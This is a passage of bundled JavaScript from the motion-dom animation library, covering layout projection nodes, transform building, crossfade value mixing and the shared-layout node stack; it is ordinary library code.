	const yTranslate = delta.y.translate / treeScale.y;
	const zTranslate = latestTransform?.z || 0;
	if (xTranslate || yTranslate || zTranslate) transform = `translate3d(${xTranslate}px, ${yTranslate}px, ${zTranslate}px) `;
	/**
	* Apply scale correction for the tree transform.
	* This will apply scale to the screen-orientated axes.
	*/
	if (treeScale.x !== 1 || treeScale.y !== 1) transform += `scale(${1 / treeScale.x}, ${1 / treeScale.y}) `;
	if (latestTransform) {
		const { transformPerspective, rotate, pathRotation, rotateX, rotateY, skewX, skewY } = latestTransform;
		if (transformPerspective) transform = `perspective(${transformPerspective}px) ${transform}`;
		if (rotate) transform += `rotate(${rotate}deg) `;
		if (pathRotation) transform += `rotate(${pathRotation}deg) `;
		if (rotateX) transform += `rotateX(${rotateX}deg) `;
		if (rotateY) transform += `rotateY(${rotateY}deg) `;
		if (skewX) transform += `skewX(${skewX}deg) `;
		if (skewY) transform += `skewY(${skewY}deg) `;
	}
	/**
	* Apply scale to match the size of the element to the size we want it.
	* This will apply scale to the element-orientated axes.
	*/
	const elementScaleX = delta.x.scale * treeScale.x;
	const elementScaleY = delta.y.scale * treeScale.y;
	if (elementScaleX !== 1 || elementScaleY !== 1) transform += `scale(${elementScaleX}, ${elementScaleY})`;
	return transform || "none";
}
// node_modules/motion-dom/dist/es/projection/animation/mix-values.mjs
var numBorders = cornerRadiusProps.length;
var asNumber = (value) => typeof value === "string" ? parseFloat(value) : value;
var isPx = (value) => typeof value === "number" || px.test(value);
function mixValues(target, follow, lead, progress, shouldCrossfadeOpacity, isOnlyMember) {
	if (shouldCrossfadeOpacity) {
		target.opacity = mixNumber$1(0, lead.opacity ?? 1, easeCrossfadeIn(progress));
		target.opacityExit = mixNumber$1(follow.opacity ?? 1, 0, easeCrossfadeOut(progress));
	} else if (isOnlyMember) target.opacity = mixNumber$1(follow.opacity ?? 1, lead.opacity ?? 1, progress);
	/**
	* Mix border radius
	*/
	for (let i = 0; i < numBorders; i++) {
		const borderLabel = cornerRadiusProps[i];
		let followRadius = getRadius(follow, borderLabel);
		let leadRadius = getRadius(lead, borderLabel);
		if (followRadius === void 0 && leadRadius === void 0) continue;
		followRadius || (followRadius = 0);
		leadRadius || (leadRadius = 0);
		if (followRadius === 0 || leadRadius === 0 || isPx(followRadius) === isPx(leadRadius)) {
			target[borderLabel] = Math.max(mixNumber$1(asNumber(followRadius), asNumber(leadRadius), progress), 0);
			if (percent.test(leadRadius) || percent.test(followRadius)) target[borderLabel] += "%";
		} else target[borderLabel] = leadRadius;
	}
	/**
	* Mix rotation
	*/
	if (follow.rotate || lead.rotate) target.rotate = mixNumber$1(follow.rotate || 0, lead.rotate || 0, progress);
}
function getRadius(values, radiusName) {
	return values[radiusName] !== void 0 ? values[radiusName] : values.borderRadius;
}
var easeCrossfadeIn = /*@__PURE__*/ compress(0, .5, circOut);
var easeCrossfadeOut = /*@__PURE__*/ compress(.5, .95, noop);
function compress(min, max, easing) {
	return (p) => {
		if (p < min) return 0;
		if (p > max) return 1;
		return easing(/* @__PURE__ */ progress(min, max, p));
	};
}
// node_modules/motion-dom/dist/es/animation/animate/single-value.mjs
function animateSingleValue(value, keyframes, options) {
	const motionValue$1 = isMotionValue(value) ? value : motionValue(value);
	motionValue$1.start(animateMotionValue("", motionValue$1, keyframes, options));
	return motionValue$1.animation;
}
// node_modules/motion-dom/dist/es/events/add-dom-event.mjs
function addDomEvent(target, eventName, handler, options = { passive: true }) {
	target.addEventListener(eventName, handler, options);
	return () => target.removeEventListener(eventName, handler, options);
}
// node_modules/motion-dom/dist/es/projection/utils/compare-by-depth.mjs
var compareByDepth = (a, b) => a.depth - b.depth;
// node_modules/motion-dom/dist/es/projection/utils/flat-tree.mjs
var FlatTree = class {
	constructor() {
		this.children = [];
		this.isDirty = false;
	}
	add(child) {
		addUniqueItem(this.children, child);
		this.isDirty = true;
	}
	remove(child) {
		removeItem(this.children, child);
		this.isDirty = true;
	}
	forEach(callback) {
		this.isDirty && this.children.sort(compareByDepth);
		this.isDirty = false;
		this.children.forEach(callback);
	}
};
// node_modules/motion-dom/dist/es/utils/delay.mjs
/**
* Timeout defined in ms
*/
function delay(callback, timeout) {
	const start = time.now();
	const checkElapsed = ({ timestamp }) => {
		const elapsed = timestamp - start;
		if (elapsed >= timeout) {
			cancelFrame(checkElapsed);
			callback(elapsed - timeout);
		}
	};
	frame.setup(checkElapsed, true);
	return () => cancelFrame(checkElapsed);
}
// node_modules/motion-dom/dist/es/value/utils/resolve-motion-value.mjs
/**
* If the provided value is a MotionValue, this returns the actual value, otherwise just the value itself
*/
function resolveMotionValue(value) {
	return isMotionValue(value) ? value.get() : value;
}
// node_modules/motion-dom/dist/es/projection/shared/stack.mjs
var NodeStack = class {
	constructor() {
		this.members = [];
	}
	add(node) {
		addUniqueItem(this.members, node);
		for (let i = this.members.length - 1; i >= 0; i--) {
			const member = this.members[i];
			if (member === node || member === this.lead || member === this.prevLead) continue;
			const inst = member.instance;
			if ((!inst || inst.isConnected === false) && !member.snapshot) {
				removeItem(this.members, member);
				member.unmount();
			}
		}
		node.scheduleRender();
	}
	remove(node) {
		removeItem(this.members, node);
		if (node === this.prevLead) this.prevLead = void 0;
		if (node === this.lead) {
			const prevLead = this.members[this.members.length - 1];
			if (prevLead) this.promote(prevLead);
		}
	}
	relegate(node) {
		for (let i = this.members.indexOf(node) - 1; i >= 0; i--) {
			const member = this.members[i];
			if (member.isPresent !== false && member.instance?.isConnected !== false) {
				this.promote(member);
				return true;
			}
		}
		return false;
	}
	promote(node, preserveFollowOpacity) {
		const prevLead = this.lead;
		if (node === prevLead) return;
		this.prevLead = prevLead;
		this.lead = node;
		node.show();
		if (prevLead) {
			prevLead.updateSnapshot();
			node.scheduleRender();
			const { layoutDependency: prevDep } = prevLead.options;
			const { layoutDependency: nextDep } = node.options;
			if (prevDep === void 0 || prevDep !== nextDep) {
				node.resumeFrom = prevLead;
				if (preserveFollowOpacity) prevLead.preserveOpacity = true;
				if (prevLead.snapshot) {
					node.snapshot = prevLead.snapshot;
					node.snapshot.latestValues = prevLead.animationValues || prevLead.latestValues;
				}
				if (node.root?.isUpdating) node.isLayoutDirty = true;
			}
			if (node.options.crossfade === false) prevLead.hide();
		}
	}
	exitAnimationComplete() {
		this.members.forEach((member) => {
			member.options.onExitComplete?.();
			member.resumingFrom?.options.onExitComplete?.();
		});
	}
	scheduleRender() {
		this.members.forEach((member) => member.instance && member.scheduleRender(false));
	}
	removeLeadSnapshot() {
		if (this.lead?.snapshot) this.lead.snapshot = void 0;
	}
};
// node_modules/motion-dom/dist/es/projection/node/state.mjs
/**
* This should only ever be modified on the client otherwise it'll
* persist through server requests. If we need instanced states we
* could lazy-init via root.
*/
var globalProjectionState = {
	/**
	* Global flag as to whether the tree has animated since the last time
	* we resized the window
	*/
	hasAnimatedSinceResize: true,
	/**
	* We set this to true once, on the first update. Any nodes added to the tree beyond that
	* update will be given a `data-projection-id` attribute.
	*/
	hasEverUpdated: false
};
// node_modules/motion-dom/dist/es/projection/node/create-projection-node.mjs
var metrics = {
	nodes: 0,
	calculatedTargetDeltas: 0,
	calculatedProjections: 0
};
var transformAxes = [
	"",
	"X",
	"Y",
	"Z"
];
/**
* We use 1000 as the animation target as 0-1000 maps better to pixels than 0-1
* which has a noticeable difference in spring animations
*/
var animationTarget = 1e3;
var id$1 = 0;
function resetDistortingTransform(key, visualElement, values, sharedAnimationValues) {
	const { latestValues } = visualElement;
	if (latestValues[key]) {
		values[key] = latestValues[key];
		visualElement.setStaticValue(key, 0);
		if (sharedAnimationValues) sharedAnimationValues[key] = 0;
	}
}
function cancelTreeOptimisedTransformAnimations(projectionNode) {
	projectionNode.hasCheckedOptimisedAppear = true;
	if (projectionNode.root === projectionNode) return;
	const { visualElement } = projectionNode.options;
	if (!visualElement) return;
	const appearId = getOptimisedAppearId(visualElement);
	if (window.MotionHasOptimisedAnimation(appearId, "transform")) {
		const { layout, layoutId } = projectionNode.options;
		window.MotionCancelOptimisedAnimation(appearId, "transform", frame, !(layout || layoutId));
	}
	const { parent } = projectionNode;
	if (parent && !parent.hasCheckedOptimisedAppear) cancelTreeOptimisedTransformAnimations(parent);
}
function createProjectionNode$1({ attachResizeListener, defaultParent, measureScroll, checkIsScrollRoot, resetTransform }) {
	return class ProjectionNode {
		constructor(latestValues = {}, parent = defaultParent?.()) {
			/**
			* A unique ID generated for every projection node.
			*/
			this.id = id$1++;
			/**
			* An id that represents a unique session instigated by startUpdate.
			*/
			this.animationId = 0;
			this.animationCommitId = 0;
			/**
			* A Set containing all this component's children. This is used to iterate
			* through the children.
			*
			* TODO: This could be faster to iterate as a flat array stored on the root node.
			*/
			this.children = /* @__PURE__ */ new Set();
			/**
			* Options for the node. We use this to configure what kind of layout animations
			* we should perform (if any).
			*/
			this.options = {};
			/**
			* We use this to detect when its safe to shut down part of a projection tree.
			* We have to keep projecting children for scale correction and relative projection
			* until all their parents stop performing layout animations.
			*/
			this.isTreeAnimating = false;
			this.isAnimationBlocked = false;
			/**
			* Flag to true if we think this layout has been changed. We can't always know this,
			* currently we set it to true every time a component renders, or if it has a layoutDependency
			* if that has changed between renders. Additionally, components can be grouped by LayoutGroup
			* and if one node is dirtied, they all are.
			*/
			this.isLayoutDirty = false;
			/**
			* Flag to true if we think the projection calculations for this node needs
			* recalculating as a result of an updated transform or layout animation.
			*/
			this.isProjectionDirty = false;
			/**
			* Flag to true if the layout *or* transform has changed. This then gets propagated
			* throughout the projection tree, forcing any element below to recalculate on the next frame.
			*/
			this.isSharedProjectionDirty = false;
			/**
			* Flag transform dirty. This gets propagated throughout the whole tree but is only
			* respected by shared nodes.
			*/
			this.isTransformDirty = false;
			/**
			* Block layout updates for instant layout transitions throughout the tree.
			*/
			this.updateManuallyBlocked = false;
			this.updateBlockedByResize = false;
			/**
			* Set to true between the start of the first `willUpdate` call and the end of the `didUpdate`
			* call.
			*/
			this.isUpdating = false;
			/**
			* If this is an SVG element we currently disable projection transforms
			*/
			this.isSVG = false;
			/**
			* Flag to true (during promotion) if a node doing an instant layout transition needs to reset
			* its projection styles.
			*/
			this.needsReset = false;
			/**
			* Flags whether this node should have its transform reset prior to measuring.
			*/
			this.shouldResetTransform = false;
			/**
			* Store whether this node has been checked for optimised appear animations. As
			* effects fire bottom-up, and we want to look up the tree for appear animations,
			* this makes sure we only check each path once, stopping at nodes that
			* have already been checked.
			*/
			this.hasCheckedOptimisedAppear = false;
			/**
			* An object representing the calculated contextual/accumulated/tree scale.
			* This will be used to scale calculcated projection transforms, as these are
			* calculated in screen-space but need to be scaled for elements to layoutly
			* make it to their calculated destinations.
			*
			* TODO: Lazy-init
			*/
			this.treeScale = {
				x: 1,
				y: 1
			};
			/**
			*
			*/
			this.eventHandlers = /* @__PURE__ */ new Map();
			this.hasTreeAnimated = false;
			this.layoutVersion = 0;
			this.updateScheduled = false;
			this.scheduleUpdate = () => this.update();
			this.projectionUpdateScheduled = false;
			this.checkUpdateFailed = () => {
				if (this.isUpdating) {
					this.isUpdating = false;
					this.clearAllSnapshots();
				}
			};
			/**
			* This is a multi-step process as shared nodes might be of different depths. Nodes
			* are sorted by depth order, so we need to resolve the entire tree before moving to
			* the next step.
			*/
			this.updateProjection = () => {
				this.projectionUpdateScheduled = false;
				/**
				* Reset debug counts. Manually resetting rather than creating a new
				* object each frame.
				*/
				if (statsBuffer.value) metrics.nodes = metrics.calculatedTargetDeltas = metrics.calculatedProjections = 0;
				this.nodes.forEach(propagateDirtyNodes);
				this.nodes.forEach(resolveTargetDelta);
				this.nodes.forEach(calcProjection);
				this.nodes.forEach(cleanDirtyNodes);
				if (statsBuffer.addProjectionMetrics) statsBuffer.addProjectionMetrics(metrics);
			};
			/**
			* Frame calculations
			*/
			this.resolvedRelativeTargetAt = 0;
			this.linkedParentVersion = 0;
			this.hasProjected = false;
			this.isVisible = true;
			this.animationProgress = 0;
			/**
			* Shared layout
			*/
			this.sharedNodes = /* @__PURE__ */ new Map();
			this.latestValues = latestValues;
			this.root = parent ? parent.root || parent : this;
			this.path = parent ? [...parent.path, parent] : [];
			this.parent = parent;
			this.depth = parent ? parent.depth + 1 : 0;
			for (let i = 0; i < this.path.length; i++) this.path[i].shouldResetTransform = true;
			if (this.root === this) this.nodes = new FlatTree();
		}
		addEventListener(name, handler) {
			if (!this.eventHandlers.has(name)) this.eventHandlers.set(name, new SubscriptionManager());
			return this.eventHandlers.get(name).add(handler);
		}
		notifyListeners(name, ...args) {
			const subscriptionManager = this.eventHandlers.get(name);
			subscriptionManager && subscriptionManager.notify(...args);
		}
		hasListeners(name) {
			return this.eventHandlers.has(name);
		}
		/**
		* Lifecycles
		*/
		mount(instance) {
			if (this.instance) return;
			this.isSVG = isSVGElement(instance) && !isSVGSVGElement(instance);
			this.instance = instance;
			const { layoutId, layout, visualElement } = this.options;
			if (visualElement && !visualElement.current) visualElement.mount(instance);
			this.root.nodes.add(this);
			this.parent && this.parent.children.add(this);
			if (this.root.hasTreeAnimated && (layout || layoutId)) this.isLayoutDirty = true;
			if (attachResizeListener) {
				let cancelDelay;
				let innerWidth = 0;
				const resizeUnblockUpdate = () => this.root.updateBlockedByResize = false;
				frame.read(() => {
					innerWidth = window.innerWidth;
				});
				attachResizeListener(instance, () => {
					const newInnerWidth = window.innerWidth;
					if (newInnerWidth === innerWidth) return;
					innerWidth = newInnerWidth;
					this.root.updateBlockedByResize = true;
					cancelDelay && cancelDelay();
					cancelDelay = delay(resizeUnblockUpdate, 250);
					if (globalProjectionState.hasAnimatedSinceResize) {
						globalProjectionState.hasAnimatedSinceResize = false;
						this.nodes.forEach(finishAnimation);
					}
				});
			}
			if (layoutId) this.root.registerSharedNode(layoutId, this);
			if (this.options.animate !== false && visualElement && (layoutId || layout)) this.addEventListener("didUpdate", ({ delta, hasLayoutChanged, hasRelativeLayoutChanged, layout: newLayout }) => {
				if (this.isTreeAnimationBlocked()) {
					this.target = void 0;
					this.relativeTarget = void 0;
					return;
				}
				const layoutTransition = this.options.transition || visualElement.getDefaultTransition() || defaultLayoutTransition;
				const { onLayoutAnimationStart, onLayoutAnimationComplete } = visualElement.getProps();
				/**
				* The target layout of the element might stay the same,
				* but its position relative to its parent has changed.
				*/
				const hasTargetChanged = !this.targetLayout || !boxEqualsRounded(this.targetLayout, newLayout);
				/**
				* If the layout hasn't seemed to have changed, it might be that the
				* element is visually in the same place in the document but its position
				* relative to its parent has indeed changed. So here we check for that.
				*/
				const hasOnlyRelativeTargetChanged = !hasLayoutChanged && hasRelativeLayoutChanged;
				if (this.options.layoutRoot || this.resumeFrom || hasOnlyRelativeTargetChanged || hasLayoutChanged && (hasTargetChanged || !this.currentAnimation)) {
					if (this.resumeFrom) {
						this.resumingFrom = this.resumeFrom;
						this.resumingFrom.resumingFrom = void 0;
					}
					const animationOptions = {
						...getValueTransition(layoutTransition, "layout"),
						onPlay: onLayoutAnimationStart,
						onComplete: onLayoutAnimationComplete
					};
					if (visualElement.shouldReduceMotion || this.options.layoutRoot) {
						animationOptions.delay = 0;
						animationOptions.type = false;
					}
					this.startAnimation(animationOptions);
					/**
					* Set animation origin after starting animation to avoid layout jump
					* caused by stopping previous layout animation
					*/
					this.setAnimationOrigin(delta, hasOnlyRelativeTargetChanged, animationOptions.path);
				} else {
					/**
					* If the layout hasn't changed and we have an animation that hasn't started yet,
					* finish it immediately. Otherwise it will be animating from a location
					* that was probably never committed to screen and look like a jumpy box.
					*/
					if (!hasLayoutChanged) finishAnimation(this);
					if (this.isLead() && this.options.onExitComplete) this.options.onExitComplete();
				}
				this.targetLayout = newLayout;
			});
		}
		unmount() {
			this.options.layoutId && this.willUpdate();
			this.root.nodes.remove(this);
			const stack = this.getStack();
			stack && stack.remove(this);
			this.parent && this.parent.children.delete(this);
			this.instance = void 0;
			this.eventHandlers.clear();
			cancelFrame(this.updateProjection);
		}
		blockUpdate() {
			this.updateManuallyBlocked = true;
		}
		unblockUpdate() {
			this.updateManuallyBlocked = false;
		}
		isUpdateBlocked() {
			return this.updateManuallyBlocked || this.updateBlockedByResize;
		}
		isTreeAnimationBlocked() {
			return this.isAnimationBlocked || this.parent && this.parent.isTreeAnimationBlocked() || false;
		}
		startUpdate() {
			if (this.isUpdateBlocked()) return;
			this.isUpdating = true;
			this.nodes && this.nodes.forEach(resetSkewAndRotation);
			this.animationId++;
		}
		getTransformTemplate() {
			const { visualElement } = this.options;
			return visualElement && visualElement.getProps().transformTemplate;
		}
		willUpdate(shouldNotifyListeners = true) {
			this.root.hasTreeAnimated = true;
			if (this.root.isUpdateBlocked()) {
				this.options.onExitComplete && this.options.onExitComplete();
				return;
			}
			/**
			* If we're running optimised appear animations then these must be
			* cancelled before measuring the DOM. This is so we can measure
			* the true layout of the element rather than the WAAPI animation
			* which will be unaffected by the resetSkewAndRotate step.
			*
			* Note: This is a DOM write. Worst case scenario is this is sandwiched
			* between other snapshot reads which will cause unnecessary style recalculations.
			* This has to happen here though, as we don't yet know which nodes will need
			* snapshots in startUpdate(), but we only want to cancel optimised animations
			* if a layout animation measurement is actually going to be affected by them.
			*/
			if (window.MotionCancelOptimisedAnimation && !this.hasCheckedOptimisedAppear) cancelTreeOptimisedTransformAnimations(this);
			!this.root.isUpdating && this.root.startUpdate();
			if (this.isLayoutDirty) return;
			this.isLayoutDirty = true;
			for (let i = 0; i < this.path.length; i++) {
				const node = this.path[i];
				node.shouldResetTransform = true;
				/**
				* Percentage translates resolve against layoutBox dimensions,
				* so ancestors with them must be re-measured after transform reset.
				*/
				if (typeof node.latestValues.x === "string" || typeof node.latestValues.y === "string") node.isLayoutDirty = true;
				node.updateScroll("snapshot");
				if (node.options.layoutRoot) node.willUpdate(false);
			}
			const { layoutId, layout } = this.options;
			if (layoutId === void 0 && !layout) return;
			const transformTemplate = this.getTransformTemplate();
			this.prevTransformTemplateValue = transformTemplate ? transformTemplate(this.latestValues, "") : void 0;
			this.updateSnapshot();
			shouldNotifyListeners && this.notifyListeners("willUpdate");
		}
		update() {
			this.updateScheduled = false;
			if (this.isUpdateBlocked()) {
				const wasBlockedByResize = this.updateBlockedByResize;
				this.unblockUpdate();
				this.updateBlockedByResize = false;
				this.clearAllSnapshots();
				/**
				* When blocked by resize, still measure layouts so
				* callbacks like onLayoutMeasure fire (e.g. Reorder).
				* Skip notifyLayoutUpdate to prevent animations.
				*/
				if (wasBlockedByResize) this.nodes.forEach(forceLayoutMeasure);
				this.nodes.forEach(clearMeasurements);
				return;
			}
			/**
			* If this is a repeat of didUpdate then ignore the animation.
			*/
			if (this.animationId <= this.animationCommitId) {
				this.nodes.forEach(clearIsLayoutDirty);
				return;
			}
			this.animationCommitId = this.animationId;
			if (!this.isUpdating) this.nodes.forEach(clearIsLayoutDirty);
			else {
				this.isUpdating = false;
				/**
				* Ensure animation-blocked nodes (e.g. during drag)
				* get measured even when memoized (willUpdate skipped).
				*/
				this.nodes.forEach(ensureDraggedNodesSnapshotted);
				/**
				* Write
				*/
				this.nodes.forEach(resetTransformStyle);
				/**
				* Read ==================
				*/
				this.nodes.forEach(updateLayout);
				/**
				* Write
				*/
				this.nodes.forEach(notifyLayoutUpdate);
			}
			this.clearAllSnapshots();
			/**
			* Manually flush any pending updates. Ideally
			* we could leave this to the following requestAnimationFrame but this seems
			* to leave a flash of incorrectly styled content.
			*/
			const now = time.now();
			frameData.delta = clamp(0, 1e3 / 60, now - frameData.timestamp);
			frameData.timestamp = now;
			frameData.isProcessing = true;
			frameSteps.update.process(frameData);
			frameSteps.preRender.process(frameData);
			frameSteps.render.process(frameData);
			frameData.isProcessing = false;
		}
		didUpdate() {
			if (!this.updateScheduled) {
				this.updateScheduled = true;
				microtask.read(this.scheduleUpdate);
			}
		}
		clearAllSnapshots() {
			this.nodes.forEach(clearSnapshot);
			this.sharedNodes.forEach(removeLeadSnapshots);
		}
		scheduleUpdateProjection() {
			if (!this.projectionUpdateScheduled) {
				this.projectionUpdateScheduled = true;
				frame.preRender(this.updateProjection, false, true);
			}
		}
		scheduleCheckAfterUnmount() {
			/**
			* If the unmounting node is in a layoutGroup and did trigger a willUpdate,
			* we manually call didUpdate to give a chance to the siblings to animate.
			* Otherwise, cleanup all snapshots to prevents future nodes from reusing them.
			*/
			frame.postRender(() => {
				if (this.isLayoutDirty) this.root.didUpdate();
				else this.root.checkUpdateFailed();
			});
		}
		/**
		* Update measurements
		*/
		updateSnapshot() {
			if (this.snapshot || !this.instance) return;
			this.snapshot = this.measure();
			if (this.snapshot && !calcLength(this.snapshot.measuredBox.x) && !calcLength(this.snapshot.measuredBox.y)) this.snapshot = void 0;
		}
		updateLayout() {
			if (!this.instance) return;
			this.updateScroll();
			if (!(this.options.alwaysMeasureLayout && this.isLead()) && !this.isLayoutDirty) return;
			/**
			* When a node is mounted, it simply resumes from the prevLead's
			* snapshot instead of taking a new one, but the ancestors scroll
			* might have updated while the prevLead is unmounted. We need to
			* update the scroll again to make sure the layout we measure is
			* up to date.
			*/
			if (this.resumeFrom && !this.resumeFrom.instance) for (let i = 0; i < this.path.length; i++) this.path[i].updateScroll();
			const prevLayout = this.layout;
			this.layout = this.measure(false);
			this.layoutVersion++;
			if (!this.layoutCorrected) this.layoutCorrected = createBox();
			this.isLayoutDirty = false;
			this.projectionDelta = void 0;
			this.notifyListeners("measure", this.layout.layoutBox);
			const { visualElement } = this.options;
			visualElement && visualElement.notify("LayoutMeasure", this.layout.layoutBox, prevLayout ? prevLayout.layoutBox : void 0);
		}
		updateScroll(phase = "measure") {
			let needsMeasurement = Boolean(this.options.layoutScroll && this.instance);
			if (this.scroll && this.scroll.animationId === this.root.animationId && this.scroll.phase === phase) needsMeasurement = false;
			if (needsMeasurement && this.instance) {
				const isRoot = checkIsScrollRoot(this.instance);
				this.scroll = {
					animationId: this.root.animationId,
					phase,
					isRoot,
					offset: measureScroll(this.instance),
					wasRoot: this.scroll ? this.scroll.isRoot : isRoot
				};
			}
		}
		resetTransform() {
			if (!resetTransform) return;
			const isResetRequested = this.isLayoutDirty || this.shouldResetTransform || this.options.alwaysMeasureLayout;
			const hasProjection = this.projectionDelta && !isDeltaZero(this.projectionDelta);
			const transformTemplate = this.getTransformTemplate();
			const transformTemplateValue = transformTemplate ? transformTemplate(this.latestValues, "") : void 0;
			const transformTemplateHasChanged = transformTemplateValue !== this.prevTransformTemplateValue;
			if (isResetRequested && this.instance && (hasProjection || hasTransform(this.latestValues) || transformTemplateHasChanged)) {
				resetTransform(this.instance, transformTemplateValue);
				this.shouldResetTransform = false;
				this.scheduleRender();
			}
		}
		measure(removeTransform = true) {
			const pageBox = this.measurePageBox();
			let layoutBox = this.removeElementScroll(pageBox);
			/**
			* Measurements taken during the pre-render stage
			* still have transforms applied so we remove them
			* via calculation.
			*/
			if (removeTransform) layoutBox = this.removeTransform(layoutBox);
			roundBox(layoutBox);
			return {
				animationId: this.root.animationId,
				measuredBox: pageBox,
				layoutBox,
				latestValues: {},
				source: this.id
			};
		}
		measurePageBox() {
			const { visualElement } = this.options;
			if (!visualElement) return createBox();
			const box = visualElement.measureViewportBox();
			if (!(this.scroll?.wasRoot || this.path.some(checkNodeWasScrollRoot))) {
				const { scroll } = this.root;
				if (scroll) {
					translateAxis(box.x, scroll.offset.x);
					translateAxis(box.y, scroll.offset.y);
				}
			}
			return box;
		}
		removeElementScroll(box) {
			const boxWithoutScroll = createBox();
			copyBoxInto(boxWithoutScroll, box);
			if (this.scroll?.wasRoot) return boxWithoutScroll;
			/**
			* Performance TODO: Keep a cumulative scroll offset down the tree
			* rather than loop back up the path.
			*/
			for (let i = 0; i < this.path.length; i++) {
				const node = this.path[i];
				const { scroll, options } = node;
				if (node !== this.root && scroll && options.layoutScroll) {
					/**
					* If this is a new scroll root, we want to remove all previous scrolls
					* from the viewport box.
					*/
					if (scroll.wasRoot) copyBoxInto(boxWithoutScroll, box);
					translateAxis(boxWithoutScroll.x, scroll.offset.x);
					translateAxis(boxWithoutScroll.y, scroll.offset.y);
				}
			}
			return boxWithoutScroll;
		}
		applyTransform(box, transformOnly = false, output) {
			const withTransforms = output || createBox();
			copyBoxInto(withTransforms, box);
			for (let i = 0; i < this.path.length; i++) {
				const node = this.path[i];
				if (!transformOnly && node.options.layoutScroll && node.scroll && node !== node.root) {
					translateAxis(withTransforms.x, -node.scroll.offset.x);
					translateAxis(withTransforms.y, -node.scroll.offset.y);
				}
				if (!hasTransform(node.latestValues)) continue;
				transformBox(withTransforms, node.latestValues, node.layout?.layoutBox);
			}
			if (hasTransform(this.latestValues)) transformBox(withTransforms, this.latestValues, this.layout?.layoutBox);
			return withTransforms;
		}
		removeTransform(box) {
			const boxWithoutTransform = createBox();
			copyBoxInto(boxWithoutTransform, box);
			for (let i = 0; i < this.path.length; i++) {
				const node = this.path[i];
				if (!hasTransform(node.latestValues)) continue;
				let sourceBox;
				if (node.instance) {
					hasScale(node.latestValues) && node.updateSnapshot();
					sourceBox = createBox();
					copyBoxInto(sourceBox, node.measurePageBox());
				}
				removeBoxTransforms(boxWithoutTransform, node.latestValues, node.snapshot?.layoutBox, sourceBox);
			}
			if (hasTransform(this.latestValues)) removeBoxTransforms(boxWithoutTransform, this.latestValues);
			return boxWithoutTransform;
		}
		setTargetDelta(delta) {
			this.targetDelta = delta;
			this.root.scheduleUpdateProjection();
			this.isProjectionDirty = true;
		}
		setOptions(options) {
			this.options = {
				...this.options,
				...options,
				crossfade: options.crossfade !== void 0 ? options.crossfade : true
			};
		}
		clearMeasurements() {
			this.scroll = void 0;
			this.layout = void 0;
			this.snapshot = void 0;
			this.prevTransformTemplateValue = void 0;
			this.targetDelta = void 0;
			this.target = void 0;
			this.isLayoutDirty = false;
		}
		forceRelativeParentToResolveTarget() {
			if (!this.relativeParent) return;
			/**
			* If the parent target isn't up-to-date, force it to update.
			* This is an unfortunate de-optimisation as it means any updating relative
			* projection will cause all the relative parents to recalculate back
			* up the tree.
			*/
			if (this.relativeParent.resolvedRelativeTargetAt !== frameData.timestamp) this.relativeParent.resolveTargetDelta(true);
		}
		resolveTargetDelta(forceRecalculation = false) {
			/**
			* Once the dirty status of nodes has been spread through the tree, we also
			* need to check if we have a shared node of a different depth that has itself
			* been dirtied.
			*/
			const lead = this.getLead();
			this.isProjectionDirty || (this.isProjectionDirty = lead.isProjectionDirty);
			this.isTransformDirty || (this.isTransformDirty = lead.isTransformDirty);
			this.isSharedProjectionDirty || (this.isSharedProjectionDirty = lead.isSharedProjectionDirty);
			const isShared = Boolean(this.resumingFrom) || this !== lead;
			if (!(forceRecalculation || isShared && this.isSharedProjectionDirty || this.isProjectionDirty || this.parent?.isProjectionDirty || this.attemptToResolveRelativeTarget || this.root.updateBlockedByResize)) return;
			const { layout, layoutId } = this.options;
			/**
			* If we have no layout, we can't perform projection, so early return
			*/
			if (!this.layout || !(layout || layoutId)) return;
			this.resolvedRelativeTargetAt = frameData.timestamp;
			const relativeParent = this.getClosestProjectingParent();
			if (relativeParent && this.linkedParentVersion !== relativeParent.layoutVersion && !relativeParent.options.layoutRoot) this.removeRelativeTarget();
			/**
			* If we don't have a targetDelta but do have a layout, we can attempt to resolve
			* a relativeParent. This will allow a component to perform scale correction
			* even if no animation has started.
			*/
			if (!this.targetDelta && !this.relativeTarget) {
				if (this.options.layoutAnchor !== false && relativeParent && relativeParent.layout) this.createRelativeTarget(relativeParent, this.layout.layoutBox, relativeParent.layout.layoutBox);
				else this.removeRelativeTarget();
			}
			/**
			* If we have no relative target or no target delta our target isn't valid
			* for this frame.
			*/
			if (!this.relativeTarget && !this.targetDelta) return;
			/**
			* Lazy-init target data structure
			*/
			if (!this.target) {
				this.target = createBox();
				this.targetWithTransforms = createBox();
			}
			/**
			* If we've got a relative box for this component, resolve it into a target relative to the parent.
			*/
			if (this.relativeTarget && this.relativeTargetOrigin && this.relativeParent && this.relativeParent.target) {
				this.forceRelativeParentToResolveTarget();
				calcRelativeBox(this.target, this.relativeTarget, this.relativeParent.target, this.options.layoutAnchor || void 0);
			} else if (this.targetDelta) {
				if (Boolean(this.resumingFrom)) this.applyTransform(this.layout.layoutBox, false, this.target);
				else copyBoxInto(this.target, this.layout.layoutBox);
				applyBoxDelta(this.target, this.targetDelta);
			} else
 /**
			* If no target, use own layout as target
			*/
			copyBoxInto(this.target, this.layout.layoutBox);
			/**
			* If we've been told to attempt to resolve a relative target, do so.
			*/
			if (this.attemptToResolveRelativeTarget) {
				this.attemptToResolveRelativeTarget = false;
				if (this.options.layoutAnchor !== false && relativeParent && Boolean(relativeParent.resumingFrom) === Boolean(this.resumingFrom) && !relativeParent.options.layoutScroll && relativeParent.target && this.animationProgress !== 1) this.createRelativeTarget(relativeParent, this.target, relativeParent.target);
				else this.relativeParent = this.relativeTarget = void 0;
			}
			/**
			* Increase debug counter for resolved target deltas
			*/
			if (statsBuffer.value) metrics.calculatedTargetDeltas++;
		}
		getClosestProjectingParent() {
			if (!this.parent || hasScale(this.parent.latestValues) || has2DTranslate(this.parent.latestValues)) return;
			if (this.parent.isProjecting()) return this.parent;
			else return this.parent.getClosestProjectingParent();
		}
		isProjecting() {
			return Boolean((this.relativeTarget || this.targetDelta || this.options.layoutRoot) && this.layout);
		}
		createRelativeTarget(relativeParent, layout, parentLayout) {
			this.relativeParent = relativeParent;
			this.linkedParentVersion = relativeParent.layoutVersion;
			this.forceRelativeParentToResolveTarget();
			this.relativeTarget = createBox();
			this.relativeTargetOrigin = createBox();
			calcRelativePosition(this.relativeTargetOrigin, layout, parentLayout, this.options.layoutAnchor || void 0);
			copyBoxInto(this.relativeTarget, this.relativeTargetOrigin);
		}
		removeRelativeTarget() {
			this.relativeParent = this.relativeTarget = void 0;
		}
		calcProjection() {
			const lead = this.getLead();
			const isShared = Boolean(this.resumingFrom) || this !== lead;
